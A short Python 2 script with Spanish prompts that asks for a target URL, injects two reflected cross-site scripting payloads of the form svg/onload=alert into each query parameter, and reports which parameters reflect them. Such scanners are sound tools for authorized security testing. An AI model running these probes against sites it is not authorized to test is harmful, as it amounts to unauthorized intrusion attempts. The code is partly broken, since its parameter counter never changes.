#!/usr/bin/python

import time
import requests
import colorama
from colorama import Fore, Back, Style
colorama.init()

url= raw_input("ingrese url para atacar :")
payload=['"><svg/onload=alert(0)>','"><svg/onload=alert(1)>']

para= url.split("&")
cont= 0

for pay in payload:
	for param in para:
		if cont == 1:
			param=param.split("?")[1]
		fullurl=url.replace(param,param+pay)
		request=requests.get(fullurl).text
		try:
			if pay in request:
				print (Fore.GREEN + "la pagina web es vulnerable en el parametro: "+param +Style.RESET_ALL)
                		print (Fore.YELLOW +"Xss verificado con el payload en la url:"+requests.get(fullurl).url + Style.RESET_ALL)
			if pay not in request:
				print (Fore.RED + "El siquiente parametro no es vulnerable :"+param + Style.RESET_ALL)
		except:
			print (Fore.RED + "la pagina web no es vulnerable" +Style.RESET_ALL)
